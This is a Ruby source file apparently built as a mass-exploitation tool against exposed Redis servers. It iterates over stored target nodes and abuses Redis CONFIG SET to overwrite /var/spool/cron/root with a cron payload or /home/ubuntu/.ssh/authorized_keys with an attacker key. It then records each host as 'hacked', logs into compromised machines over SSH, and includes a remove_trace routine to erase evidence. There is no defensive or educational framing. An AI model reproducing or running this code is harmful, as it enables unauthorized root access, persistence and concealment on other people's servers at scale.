require 'redis'
MAX = 80 << 20
class Foobar
  def self.login
    Node.redis.where(hacked_way: :pubkey).reverse.each do |n|
      begin
        n.ssh_exec
      rescue Exception => e
        puts e
      end
    end
  end

  def self.pentrating
    current = 0

    Node.redis.find_each do |node|
      puts  "x" * 100
      if node.os.downcase =~ /window/
        puts "-------- WINDOWS"
        next
      end

      #ssh_open = false
      #begin
        #ssh_open = JSON.parse(node.ports).include? 22

        #puts "---- ssh open #{ssh_open} : #{node.ports}"
      #rescue Exception => e
        #next
      #end

      #if ssh_open
        #self.upload_key node
      #else
        self.crackit_cron node
      #end

      current = current + 1
      if current > MAX
        break
      end
    end
  end

  def self.upload_key node
    pubkey = File.read(Rails.root.join("app/models/keyfile"))
    begin
      puts "----- #{node.id}  #{ node.ip } "
      puts "--------------------------------------"
      r = node.redis
      r.config "set", "stop-writes-on-bgsave-error", "no"
      r.config "set", "dir", "/home/ubuntu/.ssh/"
      r.config "set", "dbfilename", "authorized_keys"
      r.set "qwe", pubkey
      #r.save
      r.bgsave
      puts "SUCCESSS"
      node.update_column :hacked_way, :pubkey
    rescue Exception => e
      puts e
    end
  end

  def self.crackit_cron node
    cron = File.read(Rails.root.join("app/models/cron"))
    begin
      puts "----- #{node.id}  #{ node.ip } "
      puts "--------------------------------------"
      r = node.redis
      r.config "set", "stop-writes-on-bgsave-error", "no"
      r.config "set", "dir", "/var/spool/cron"
      r.config "set", "dbfilename", "root"
      r.set "crakcit", cron
      r.save
      #r.bgsave
      puts "SUCCESSS"
      node.update_column :hacked_way, :spool_cron
    rescue Exception => e
      puts e
    end
  end

  def self.remove_trace
    Node.redis.find_each do |node|
      begin
        r = node.redis
        r.del "crakcit"
      rescue Exception => e
        puts e
      end
    end
  end
end
